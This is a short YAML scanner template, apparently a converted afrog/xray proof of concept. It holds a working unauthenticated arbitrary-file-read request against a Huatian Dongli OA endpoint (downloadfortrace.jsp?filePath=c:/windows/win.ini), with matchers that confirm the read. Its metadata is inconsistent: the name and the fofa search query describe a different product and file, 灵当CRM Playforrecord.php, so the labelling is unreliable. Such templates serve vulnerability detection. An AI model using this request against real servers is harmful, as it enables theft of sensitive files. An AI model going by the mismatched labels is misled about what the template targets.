# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - bit app support
          - fonts
          - extensions
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/OAapp/jsp/trace_eWebEditor/downloadfortrace.jsp?filePath=c:/windows/win.ini'
id: huatiandongli-oa-downloadfortrace-fileread
info:
  author: avic123
  description: |
    华天动力OA downloadfortrace.jsp接口处存在任意文件读取漏洞，未经身份认证的攻击者可利用此漏洞获取服务器内部敏感文件，使系统处于极不安全的状态。
    fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js" || title="灵当CRM"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 灵当CRM Playforrecord.php 任意文件读取漏洞
  severity: high
  tags: huatiandongli,oa,fileread,argus-import
